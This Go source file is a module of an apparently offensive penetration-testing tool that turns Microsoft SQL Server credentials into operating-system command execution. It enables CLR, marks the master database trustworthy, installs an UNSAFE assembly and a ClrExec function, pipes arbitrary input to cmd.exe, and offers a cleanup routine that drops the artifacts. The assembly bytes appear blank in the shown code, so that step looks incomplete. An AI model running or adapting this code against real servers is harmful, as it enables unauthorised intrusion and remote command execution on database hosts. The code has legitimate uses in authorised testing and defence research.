package sqlcmdmodule

import (
	"cube/gologger"
	"database/sql"
	"fmt"
)

type Mssql3 struct {
	*Sqlcmd
}

func (m Mssql3) SqlcmdName() string {
	return "mssql3"
}

func (m Mssql3) SqlcmdPort() string {
	return "1433"
}

func (m Mssql3) SqlcmdDesc() string {
	return "exec cmd via ClR"
}

func (m Mssql3) SqlcmdExec() SqlcmdResult {
	result := SqlcmdResult{Sqlcmd: *m.Sqlcmd, Result: "", Err: nil}

	dataSourceName := fmt.Sprintf("server=%v;port=%v;user id=%v;password=%v;database=%v", m.Ip,
		m.Port, m.User, m.Password, "master")
	conn, err := sql.Open("mssql", dataSourceName)
	defer conn.Close()
	if err != nil {
		result.Err = err
		return result
	}
	if m.Query == "clear" {
		closeClr(*conn)
		fmt.Println("Clear mssql Clr Successful")
		return result
	}
	v, err := conn.Prepare("select assembly_method from sys.assembly_modules;")
	row := v.QueryRow()
	var clrFlag string
	row.Scan(&clrFlag)
	if clrFlag == "run" {
		shellClr(*conn, m.Query)
	} else {
		installClr(*conn)
	}

	return result
}

func installClr(conn sql.DB) {
	value, err := conn.Prepare("select value_in_use from  sys.configurations where  name = 'clr enabled'")
	if err != nil {
		gologger.Error("Prepare failed:", err.Error())
	}
	defer value.Close()

	row := value.QueryRow()
	//var somenumber int64
	var v int
	err = row.Scan(&v)
	if err != nil {
		gologger.Error("Query failed:", err.Error())
	}
	if v == 1 {
		fmt.Printf("Mssql Clr Enabled\n")
	} else {
		fmt.Printf("Open MssqlClr...\n")
		stmt, err := conn.Prepare("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'clr enabled', 1;RECONFIGURE;")
		if err != nil {
			//fmt.Println("Query Error", err)
			return
		}

		defer stmt.Close()
		stmt.Query()

	}

	//_, err = conn.Query("DROP ASSEMBLY CLR_module;")
	//_, err = conn.Query("DROP PROCEDURE dbo.ClrExec;")

	_, err = conn.Query("alter database [master] set trustworthy on;")
	if err != nil {
		gologger.Error("Set Trustworthy Error", err)
		return
	}

	sqlInstall := fmt.Sprint("CREATE ASSEMBLY [CLR_module]\n    AUTHORIZATION [dbo]\n    FROM \n    WITH PERMISSION_SET = UNSAFE;")
	_, err = conn.Query(sqlInstall)
	if err != nil {
		gologger.Error("Create Assembly Error", err)
	}

	//sqlInstall2 := fmt.Sprint("CREATE PROCEDURE [dbo].[ClrExec]\n@cmd NVARCHAR (MAX)\nAS EXTERNAL NAME [CLR_module].[StoredProcedures].[ClrExec]")
	sqlInstall2 := fmt.Sprint("CREATE FUNCTION dbo.ClrExec(@exe as nvarchar(MAX),@arg as nvarchar(MAX))RETURNS nvarchar(MAX) AS EXTERNAL NAME CLR_module.[luan.cmd].run")

	_, err = conn.Query(sqlInstall2)
	if err != nil {
		gologger.Error("Create Function Error", err)
	}
}

func shellClr(conn sql.DB, cmd string) {
	sqlstr := fmt.Sprint("select dbo.ClrExec('C:\\Windows\\System32\\cmd.exe', '/c " + cmd + "')")
	//fmt.Println(sqlstr)
	rows, err := conn.Query(sqlstr)
	if err != nil {
		panic(err.Error())
	}
	defer rows.Close()

	columns, err := rows.Columns()
	if err != nil {
		panic(err.Error())
	}
	values := make([]sql.RawBytes, len(columns))
	scanArgs := make([]interface{}, len(values))
	for i := range values {
		scanArgs[i] = &values[i]
	}

	for rows.Next() {
		err = rows.Scan(scanArgs...)
		if err != nil {
			panic(err.Error())
		}
		var value string
		for _, col := range values {
			if col == nil {
				value = ""
			} else {
				value = string(col)
			}
			fmt.Println(value)

		}

	}
	if err = rows.Err(); err != nil {
		panic(err.Error()) // proper error handling instead of panic in your app
	}
}

func closeClr(conn sql.DB) {
	stmt, err := conn.Prepare("DROP FUNCTION dbo.ClrExec;DROP ASSEMBLY CLR_module;")

	if err != nil {
		gologger.Error("Prepare failed:", err.Error())
	}
	stmt.Query()
	defer stmt.Close()
}
